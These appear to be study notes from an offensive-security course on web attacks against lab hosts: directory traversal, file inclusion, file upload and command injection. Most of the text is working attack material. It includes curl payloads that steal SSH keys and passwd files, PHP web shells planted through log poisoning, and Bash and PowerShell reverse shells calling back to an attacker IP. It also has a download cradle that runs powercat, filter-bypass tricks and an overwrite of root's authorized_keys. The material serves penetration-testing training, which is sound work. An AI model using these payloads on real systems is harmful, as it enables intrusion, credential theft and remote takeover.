## Common Web Application Attacks

- Directory Traversal
- File Inclusion Vulnerabilities
- File Upload Attack Vulnerabilities
- Command Injection

### Directory Traversal

Directory Traversal attacks, also known as path traversal attacks. This type of attack can be used to access sensitive files on a web server and typically occurs when a web application is not sanitizing user input.

In Linux systems, the /var/www/html/ directory is often used as the web root. When a web application displays a page, http://example.com/file.html for example, it will try to access /var/www/html/file.html. The http link doesn't contain any part of the path except the filename because the web root also serves as a base directory for a web server. If a web application is vulnerable to directory traversal, a user may access files outside of the web root by using relative paths, thus accessing sensitive files like SSH private keys or configuration files.

**We should always check for vulnerabilities by hovering over all buttons, checking all links, navigating to all accessible pages, and (if possible) examining the page's source code. Links can be an especially valuable source of information, providing parameters or other data about the application.**

```bash
https://example.com/cms/login.php?language=en.html
```
From this link, we can tell that the web app uses PHP, which holds assumptions about how the web app works. 

Second, the URL contains a language parameter with an HTML page as its value. In a situation like this, we should try to navigate to the file directly (https://example.com/cms/en.html). If we can successfully open it, we can confirm that en.html is a file on the server, meaning we can use this parameter to try other file names. We should always examine parameters closely when they use files as a value.

Third, the URL contains a directory called cms. This is important information indicating that the web application is running in a subdirectory of the web root.

If a page link is like ' http://mountaindesserts.com/meteor/index.php?page=blah ', then try injecting '../../../../../../etc/passwd' or '../../../../../../../../../home/offsec/.ssh/id_rsa' into the parameter and seeing what happens.

During web application assessments, we should understand that as soon as we've identified a possible vulnerability, such as with the "page" parameter in this case, we should not rely on a browser for testing. Browsers often try to parse or optimize elements for user friendliness. 

When performing web application testing, we should mainly use tools such as Burp, cURL, or a programming language of our choice.

Let's use curl to retrieve the SSH private key as we did with the browser:
```bash
kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa
...
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAz+pEKI1OmULVSs8ojO/sZseiv3zf2dbH6LSyYuj3AHkcxIND7UTw
XdUTtUeeJhbTC0h5S2TWFJ3OGB0zjCqsEI16ZHsaKI9k2CfNmpl0siekm9aQGxASpTiYOs
KCZOFoPU6kBkKyEhfjB82Ea1VoAvx4J4z7sNx1+wydQ/Kf7dawd95QjBuqLH9kQIEjkOGf
BemTOAyCdTBxzUhDz1siP9uyofquA5vhmMXWyy68pLKXpiQqTF+foGQGG90MBXS5hwskYg
...
lpWPWFQro9wzJ/uJsw/lepsqjrg2UvtrkAAADBAN5b6pbAdNmsQYmOIh8XALkNHwSusaK8
bM225OyFIxS+BLieT7iByDK4HwBmdExod29fFPwG/6mXUL2Dcjb6zKJl7AGiyqm5+0Ju5e
hDmrXeGZGg/5unGXiNtsoTJIfVjhM55Q7OUQ9NSklONUOgaTa6dyUYGqaynvUVJ/XxpBrb
iRdp0z8X8E5NZxhHnarkQE2ZHyVTSf89NudDoXiWQXcadkyrIXxLofHPrQzPck2HvWhZVA
+2iMijw3FvY/Fp4QAAAA1vZmZzZWNAb2Zmc2VjAQIDBA==
-----END OPENSSH PRIVATE KEY-----
...
```

Let's use the private key to connect to the target system via SSH on port 2222. We can use the -i parameter to specify the stolen private key file and -p to specify the port. Before we can use the private key, we'll need to modify the permissions of the dt_key file so that only the user / owner can read the file; if we don't, the ssh program will throw an error stating that the access permissions are too open.
```bash
kali@kali:~$ ssh -i dt_key -p 2222 offsec@mountaindesserts.com
The authenticity of host '[mountaindesserts.com]:2222 ([192.168.50.16]:2222)' can't be established.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
...
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for '/home/kali/dt_key' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
...

kali@kali:~$ chmod 400 dt_key

kali@kali:~$ ssh -i dt_key -p 2222 offsec@mountaindesserts.com
...
offsec@68b68f3eb343:~$ 
```
On Linux, we usually use the /etc/passwd file to test directory traversal vulnerabilities. On Windows, we can use the file **C:\Windows\System32\drivers\etc\hosts** to test directory traversal vulnerabilities, which is readable by all local users. By displaying this file, we can confirm the vulnerability exists and understand how the web application displays the contents of files.

After confirming the vulnerability, we can try to specify files containing sensitive information such as configuration files and logs.

In Linux systems, a standard vector for directory traversal is to list the users of the system by displaying the contents of /etc/passwd, check for private keys in their home directory, and use them to access the system via SSH. 

Sensitive files are more difficult to find on Windows. To identify files containing sensitive information, we need to closely examine the web application and collect information about the web server, framework, and programming language.

Once we gather information about the running application or service, we can research paths leading to sensitive files. For example, if we learn that a target system is running the Internet **Information Services (IIS)** web server, we can research its log paths and web root structure. 

Reviewing the Microsoft documentation, we learn that the logs are located at **"C:\inetpub\logs\LogFiles\W3SVC1\"**. Another file we should always check when the target is running an IIS web server is "**C:\inetpub\wwwroot\web.config**", which may contain sensitive information like passwords or usernames.

Windows uses backslashes instead of forward slashes for file paths. 

*Can you find out if a system is using Windows through the use of slashes?*

Use curl and multiple ../ sequences to try exploiting this directory traversal vulnerability in Apache 2.4.49 on the WEB18 machine.
```bash
kali@kali:/var/www/html$ curl http://192.168.50.16/cgi-bin/../../../../etc/passwd

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
</body></html>


kali@kali:/var/www/html$ curl http://192.168.50.16/cgi-bin/../../../../../../../../../../etc/passwd

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
</body></html>
```
Because leveraging ../ is a known way to abuse web application behavior, this sequence is often filtered by either the web server, web application firewalls, or the web application itself.

Fortunately for us, we can use **URL Encoding**, also called **Percent Encoding**, to potentially bypass these filters. We can leverage specific ASCII encoding lists to manually encode our query or use the online converter on the same page. For now, we will only encode the dots, which are represented as "%2e".
```bash
kali@kali:/var/www/html$ curl http://192.168.192.120/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
alfred:x:1000:1000::/home/alfred:/bin/bash
```

Generally, URL encoding is used to convert characters of a web request into a format that can be transmitted over the internet.

### File Inclusion Vulnerabilities

File inclusion vulnerabilities allow us to "include" a file in the application's running code. This means we can use file inclusion vulnerabilities to execute local or remote files.

*Log Poisoning* works by modifying data we send to a web application so that the logs contain executable code. In an LFI vulnerability scenario, the local file we include is executed if it contains executable content. This means that if we manage to write executable code to a file and include it within the running code, it will be executed.

We'll first need to review what information is controlled by us and saved by Apache in the related log.

Use curl to analyze which elements comprise a log entry by displaying the file access.log using the previously-found directory traversal vulnerability. 
```bash
kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log
...
192.168.50.1 - - [12/Apr/2022:10:34:55 +0000] "GET /meteor/index.php?page=admin.php HTTP/1.1" 200 2218 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
...
```
Before we send a request, we can modify the User Agent in Burp and specify what will be written to the access.log file.

The User-Agent request header is a characteristic string that lets servers and network peers identify the application, operating system, vendor, and/or version of the requesting user agent.
```bash
User-Agent: Mozilla/5.0 (<system-information>) <platform> (<platform-details>) <extensions>
```

Let's start Burp, open the browser, and navigate to the web page. We'll click on the Admin link at the bottom of the page, then switch back to Burp and click on the HTTP history tab. Let's select the related request and send it to Repeater.

We can now modify the User Agent to include the PHP code snippet of the following listing. This snippet accepts a command via the cmd parameter and executes it via the PHP system function on the target system. 
```php
<?php echo system($_GET['cmd']); ?>
```

The PHP code snippet was written to Apache's access.log file. By including the log file via the LFI vulnerability, we can execute the PHP code snippet.

To execute our snippet, we'll first update the page parameter in the current Burp request with a relative path.
```bash
GET /meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=ps HTTP/1.1
```
```bash
GET /meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=ls%20-la HTTP/1.1
```

We have achieved command execution on the target system and can
leverage this to get a reverse shell or add our SSH key to the
authorized_keys file for a user.

**Obtain a reverse shell by adding a command to
the cmd parameter. We can use a common Bash TCP reverse shell
one-liner:
```bash
bash -i >& /dev/tcp/192.168.45.231/4444 0>&1
```
**

Since we'll execute our command through the PHP system function, we should be aware that the command may be executed via the Bourne Shell. The reverse shell one-liner above contains syntax that is not supported by the Bourne Shell.

To ensure the reverse shell is executed via Bash, we need to modify the reverse shell command. We can do this by providing the reverse shell one-liner as argument to bash -c, which executes a command with Bash.
```bash
bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0<&1"
```
We'll once again encode the special characters with URL encoding.
```bash
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22
```
Revised.
```bash
GET /meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22 HTTP/1.1
```

Before we send the request, let's start a Netcat listener on port 4444 on our Kali machine. It will receive the incoming reverse shell from the target system. Once the listener is started, we can press Send in Burp to send the request.
```bash
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.119.3] from (UNKNOWN) [192.168.50.16] 57848
bash: cannot set terminal process group (24): Inappropriate ioctl for device
bash: no job control in this shell
www-data@fbea640f9802:/var/www/html/meteor$ ls
admin.php
bavarian.php
css
fonts
img
index.php
js
```

Exploiting LFI on Windows only differs from Linux when it comes to file paths and code execution.

When we use Log Poisoning on Windows, we should understand that the log files are located in application-specific paths. For example, on a target running XAMPP, the Apache logs can be found in C:\xampp\apache\logs\.

Exploiting File Inclusion vulnerabilities depends heavily on the web application's programming language, the version, and the web server configuration. 

Also PHP is the most common, we can also leverage LFI and RFI vulnerabilities in other frameworks or server-side scripting languages including Perl, Active Server Pages Extended, Active Server Pages, and Java Server Pages. Watch out for Node.js for LFI.

PHP offers a variety of protocol wrappers to enhance the language's capabilities. For example, PHP wrappers can be used to represent and access local or remote filesystems. We can use these wrappers to bypass filters or obtain code execution via File Inclusion vulnerabilities in PHP web applications.

We can use the **php://filter** wrapper to **display the contents of files**either with or without encodings like ROT13 or Base64.

```bash
kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=admin.php
...
<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Maintenance</title>
</head>
<body>
        <span style="color:#F00;text-align:center;">The admin page is currently under maintenance.
```

We notice that the <body> tag is not closed at the end of the HTML code. We can assume that something is missing. PHP code will be executed server side and, as such, is not shown.

Using php://filter to better understand this situation. We will not use any encoding on our first attempt. The PHP wrapper uses resource as the required parameter to specify the file stream for filtering, which is the filename in our case. We can also specify absolute or relative paths in this parameter.
```bash
kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php
...
<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Maintenance</title>
</head>
<body>
        <span style="color:#F00;text-align:center;">The admin page is currently under maintenance.
```
The output shows the same text, since the PHP code is included and executed via the LFI vulnerability. Let's now encode the output with base64 by adding *convert.base64-encode*. This converts the specified resource to a base64 string.
```bash
kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
...
<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+TWFpbn...
dF9lcnJvcik7Cn0KZWNobyAiQ29ubmVjdGVkIHN1Y2Nlc3NmdWxseSI7Cj8+Cgo8L2JvZHk+CjwvaHRtbD4K
...
```
We included base64 encoded data, while the rest of the page loaded correctly. We can now use the base64 program with the -d flag to decode the encoded data in the terminal.
```bash
kali@kali:~$ echo "PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+TWFpbnRlbmFuY2U8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgogICAgICAgIDw/cGhwIGVjaG8gJzxzcGFuIHN0eWxlPSJjb2xvcjojRjAwO3RleHQtYWxpZ246Y2VudGVyOyI+VGhlIGFkbWluIHBhZ2UgaXMgY3VycmVudGx5IHVuZGVyIG1haW50ZW5hbmNlLic7ID8+Cgo8P3BocAokc2VydmVybmFtZSA9ICJsb2NhbGhvc3QiOwokdXNlcm5hbWUgPSAicm9vdCI7CiRwYXNzd29yZCA9ICJNMDBuSzRrZUNhcmQhMiMiOwoKLy8gQ3JlYXRlIGNvbm5lY3Rpb24KJGNvbm4gPSBuZXcgbXlzcWxpKCRzZXJ2ZXJuYW1lLCAkdXNlcm5hbWUsICRwYXNzd29yZCk7CgovLyBDaGVjayBjb25uZWN0aW9uCmlmICgkY29ubi0+Y29ubmVjdF9lcnJvcikgewogIGRpZSgiQ29ubmVjdGlvbiBmYWlsZWQ6ICIgLiAkY29ubi0+Y29ubmVjdF9lcnJvcik7Cn0KZWNobyAiQ29ubmVjdGVkIHN1Y2Nlc3NmdWxseSI7Cj8+Cgo8L2JvZHk+CjwvaHRtbD4K" | base64 -d
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Maintenance</title>
</head>
<body>
        <?php echo '<span style="color:#F00;text-align:center;">The admin page is currently under maintenance.'; ?>

<?php
$servername = "localhost";
$username = "root";
$password = "M00nK4keCard!2#";

// Create connection
$conn = new mysqli($servername, $username, $password);
...
```

The decoded data contains MySQL connection information, including a username and password. We can use these credentials to connect to the database or try the password for user accounts via SSH.

While the php://filter wrapper can be used to include the contents of a file, we can use the **data:// wrapper** to **achieve code execution**. This wrapper is used to **embed data elements as plaintext or base64-encoded data in the running web application's code**. This offers an alternative method when we cannot poison a local file with PHP code.

We will try to embed a small URL-encoded PHP snippet into the web application's code. We can use the same PHP snippet as previously with ls the command
```bash
kali@kali:~$ curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
...
<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
admin.php
bavarian.php
css
fonts
img
index.php
js
...
```
It worked.

When web application firewalls or other security mechanisms are in place, they may filter strings like "system" or other PHP code elements. In such a scenario, we can try to use the data:// wrapper with base64-encoded data. We'll first encode the PHP snippet into base64, then use curl to embed and execute it via the data:// wrapper. The -n is used to not output the trailing newline.
```bash
kali@kali:~$ echo -n '<?php echo system($_GET["cmd"]);?>' | base64
PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==


kali@kali:~$ curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
...
<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
admin.php
bavarian.php
css
fonts
img
index.php
js
start.sh
...
```
This is a handy technique that may help us bypass basic filters. However, we need to be aware that **the data:// wrapper will not work in a default PHP installation**. To exploit it, the *allow_url_include* setting needs to be enabled.

Remote file inclusion (RFI) vulnerabilities are less common than LFIs since the target system must be configured in a specific way. 

 While LFI vulnerabilities can be used to include local files, RFI vulnerabilities allow us to include files from a remote system over HTTP or SMB. The included file is also executed in the context of the web application.

Common scenarios where we'll find this option enabled is when the web application loads files or contents from remote systems e.g. libraries or application data. 

Kali Linux includes several PHP webshells in the /usr/share/webshells/php/ directory that can be used for RFI. We'll use simple-backdoor.php to test the LFI vulnerability from the previous sections for RFI.
```bash
kali@kali:/usr/share/webshells/php/$ cat simple-backdoor.php
...
<?php
if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}
?>

Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
...
```
To leverage an RFI vulnerability, we need to make the remote file accessible by the target system. We can use the Python3 http.server module to start a web server on our Kali machine and serve the file we want to include remotely on the target system. The http.server module sets the web root to the current directory of our terminal.
```bash
kali@kali:/usr/share/webshells/php/$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
After the web server is running with /usr/share/webshells/php/ as its current directory, we have completed all necessary steps on our attacking machine. Next, we'll use curl to include the hosted file via HTTP and specify ls as our command.
```bash
kali@kali:/usr/share/webshells/php/$ curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"
...
<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
<!-- Simple PHP backdoor by DK (http://michaeldaw.org) --> 

<pre>admin.php
bavarian.php
css
fonts
img
index.php
js
</pre>                        
```

### File Upload Vulnerabilities

The first category consists of vulnerabilities enabling us to upload files that are executable by the web application. For example, if we can upload a PHP script to a web server where PHP is enabled, we can execute the script by accessing it via the browser or curl.

The second category consists of vulnerabilities that require us to combine the file upload mechanism with another vulnerability, such as Directory Traversal. For example, if the web application is vulnerable to Directory Traversal, we can use a relative path in the file upload request and try to overwrite files like *authorized_keys*. Furthermore, we can also combine file upload mechanisms with XML External Entity (XXE) or Cross Site Scripting (XSS) attacks. For example, when we are allowed to upload an avatar to a profile with an SVG file type, we may embed an XXE attack to display file contents or even execute code.

The third category relies on user interaction. For example, when we discover an upload form for job applications, we can try to upload a CV in .docx format with malicious macros
integrated. This category requires a person to access our uploaded file.

If the web application is a Content Management System (CMS), we can often upload an avatar for our profile or create blog posts and web pages with attached files. 

If our target is a company website, we can often find upload mechanisms in career sections or company-specific use cases.

Sometimes the file upload mechanisms are not obvious to users, so we should never skip the enumeration phase when working with a web application.

When there is a file upload option, test what kinds of files are allowed for upload. Starting with PHP file is a good option. If PHP uploads are blocked, you can try using less-commonly used PHP file extensions such as **.phps** and **.php7**. This may allow up to bypass simple filters that check for the most common file extensions, .php and .phtml. These file extensions orginate from older PHP versions, but are still supported for compatibility. **Another way to bypass simple filters is to try to capitalize the file extensions, such as .pHP.**
```bash
kali@kali:~$ curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=dir
...
 Directory of C:\xampp\htdocs\meteor\uploads

04/04/2022  06:23 AM    <DIR>          .
04/04/2022  06:23 AM    <DIR>          ..
04/04/2022  06:21 AM               328 simple-backdoor.pHP
04/04/2022  06:03 AM                15 test.txt
               2 File(s)            343 bytes
               2 Dir(s)  15,410,925,568 bytes free
...
```

Wrap up this section by obtaining a reverse shell from the target machine. We'll start a Netcat listener in a new terminal to catch the incoming reverse shell on port 4444.
```bash
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...

```

Let's use a PowerShell one-liner for our reverse
shell. Since there are several special characters in the reverse shell one-liner, we will encode the string with base64. We can use PowerShell or an online converter to perform the encoding.

First, let's create the variable $Text, which will be used for storing the reverse shell one-liner as a string. Then, we can use the method convert and the property Unicode from the class Encoding to encode the contents of the $Text variable.
```bash
kali@kali:~$ pwsh
PowerShell 7.1.3
Copyright (c) Microsoft Corporation.

https://aka.ms/powershell
Type 'help' to get help.

PS> $Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'


PS> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)

PS> $EncodedText =[Convert]::ToBase64String($Bytes)

PS> $EncodedText
JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0
...
AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA


PS> exit

```

Let's use curl to execute the encoded one-liner via the uploaded simple-backdoor.pHP. We can add the base64 encoded string for the powershell command using the -enc parameter. We'll also need to use URL encoding for the spaces.
```bash
kali@kali:~$ curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0
...
AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA

```

After executing the command, we should receive an incoming reverse shell in the second terminal where Netcat is listening.
```bash
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.119.3] from (UNKNOWN) [192.168.50.189] 50603
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 192.168.50.189
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.50.254

PS C:\xampp\htdocs\meteor\uploads> whoami
nt authority\system
```
Now we have the shell.

If the target web application was using ASP instead of PHP, we could have used the same process to obtain code execution as we did in the previous example, instead uploading an ASP web shell. Kali already contains a broad variety of web shells covering the frameworks and languages we discussed previously located in the /usr/share/webshells/ directory.

**While the implementation of a web shell is dependent on the programming language, the basic process of using a web shell is nearly identical across these frameworks and languages. After we identify the framework or language of the target web application, we need to find a way to upload our web shell. The web shell needs to be placed in a location where we can access it. Next, we can provide commands to it, which are executed on the underlying system.**

**We should be aware that the file types of our web shells may be blacklisted via a filter or upload mechanism. In situations like this, we can try to bypass the filter as in this section. However, there are other options to consider. Web applications handling and managing files often enable users to rename or modify files. We could abuse this by uploading a file with an innocent file type like .txt, then changing the file back to the original file type of the web shell by renaming it.**

For a web app like Google Drive, where we can upload any file, but cannot leverage it to get system access. In situations such as this, we need to leverage another vulnerability such as Directory Traversal to abuse the file upload mechanism.

When testing a file upload form, we should always determine
what happens when a file is uploaded twice.
- If the web application indicates that the file already exists, we can use this method to brute force the contents of a web server.
- Alternatively, if the web application displays an error message, this may provide valuable information such as the programming language or web technologies in use.

Check if the web application allows us to specify a relative path in the filename and write a file via Directory Traversal outside of the web root. We can do this by modifying the "filename" parameter in the request so it contains ../../../../../../../test.txt, then click send.

Unfortunately, we have no way of knowing if the relative path was used for placing the file. It's possible that the web application's response merely echoed our filename and sanitized it internally. For now, let's assume the relative path was used for placing the file, since we cannot find any other attack vector. If our assumption is correct, we can try to blindly overwrite files, which may lead us to system access. 

#### Web Server Accounts and Permissions

Web applications using Apache, Nginx or other dedicated web servers often run with specific users, such as www-data on Linux.

Traditionally on Windows, the IIS web server runs as a Network Service account, a passwordless built-in Windows identity with low privileges. Starting with IIS version 7.5, Microsoft introduced the IIS Application Pool Identities. These are virtual accounts running web applications grouped by application pools. Each application pool has its own pool identity, making it possible to set more precise permissions for accounts running web applications.

When using programming languages that include their own web server, administrators and developers often deploy the web application without any privilege structures by running applications as root or Administrator to avoid any permissions issues.
- This means we should always verify whether we can leverage root or administrator privileges in a file upload vulnerability.

Let's try to overwrite the authorized_keys file in the home directory for root. If this file contains the public key of a private key we control, we can access the system via SSH as the root user.
```bash
kali@kali:~$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa): fileup
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in fileup
Your public key has been saved in fileup.pub
...

kali@kali:~$ cat fileup.pub > authorized_keys
```
We can upload it using the relative path ../../../../../../../root/.ssh/authorized_keys. If we've successfully overwritten the authorized_keys file of the root user, we should be able to use our private key to connect to the system via SSH. We should note that often the root user does not carry SSH access permissions. However, since we can't check for other users by, for example, displaying the contents of /etc/passwd, this is our only option.

In the Directory Traversal Learning Unit, we connected to port 2222 on the host mountaindesserts.com and our Kali system saved the host key of the remote host. Since the target system of this section is a different machine, SSH will throw an error because it cannot verify the host key it saved previously. To avoid this error, we'll delete the known_hosts file before we connect to the system. This file contains all host keys of previous SSH connections.
```bash
kali@kali:~$ rm ~/.ssh/known_hosts

kali@kali:~$ ssh -p 2222 -i fileup root@mountaindesserts.com
The authenticity of host '[mountaindesserts.com]:2222 ([192.168.50.16]:2222)' can't be established.
ED25519 key fingerprint is SHA256:R2JQNI3WJqpEehY2Iv9QdlMAoeB3jnPvjJqqfDZ3IXU.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
...
root@76b77a6eae51:~#
```
We could successfully connect as root with our private key due to the overwritten authorized_keys file.

### Command Injection

Since most injections are filtered out, you must find the root of the filter, and try to bypass it.

If you know that one command is allowed, try executing that command AND another one of your choice (& for Windows and && for UNIX), or separate the commands with a semi-colon ('%3B').
```bash
kali@kali:~$ curl -X POST --data 'Archive=git%3Bipconfig' http://192.168.50.189:8000/archive

...
'git help -a' and 'git help -g' list available subcommands and some
concept guides. See 'git help <command>' or 'git help <concept>'
to read about a specific subcommand or concept.
See 'git help git' for an overview of the system.

Windows IP Configuration


Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 192.168.50.189
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.50.254
```
**To find out if PowerShell or CMD is executing your commands**
```bash
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```
You can use URL encoding to send it.
```bash
kali@kali:~$ curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://192.168.50.189:8000/archive

...
See 'git help git' for an overview of the system.
PowerShell
```
You can try to leverage command injection to achieve system access. We will use Powercat to create a reverse shell. Powercat is a PowerShell implementation of Netcat included in Kali. Start a new terminal, copy Powercat to the home directory for the kali user, and start a Python3 web server in the same directory.
```bash
kali@kali:~$ cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .

kali@kali:~$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
Start a third terminal tab to create a Netcat listener on port 4444 to catch the reverse shell.
```bash
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...

```
With our web server serving powercat.ps1 and Netcat listener in place, we can now use curl in the first terminal to inject the following command. It consists of two parts delimited by a semicolon. The first part uses a PowerShell download cradle to load the Powercat function contained in the powercat.ps1 script from our web server. The second command uses the powercat function to create the reverse shell with the following parameters: -c to specify where to connect, -p for the port, and -e for executing a program.
```bash
IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell 
```

Again, we'll use URL encoding for the command and send it.
```bash
kali@kali:~$ curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.119.3%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.119.3%20-p%204444%20-e%20powershell' http://192.168.50.189:8000/archive
```

After entering the command, the second terminal should show that we received a GET request for the powercat.ps1 file.
```bash
kali@kali:~$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.50.189 - - [05/Apr/2022 09:05:48] "GET /powercat.ps1 HTTP/1.1" 200 -

```

We'll also find an incoming reverse shell connection in the third terminal for our active Netcat listener.

```bash
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.119.3] from (UNKNOWN) [192.168.50.189] 50325
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator\Documents\meteor>
```

Instead of using Powercat, we could also inject a PowerShell reverse shell directly. There are many ways to exploit a command injection vulnerability that depend heavily on the underlying operating system and the implementation of the web application, as well as any security mechanisms in place.

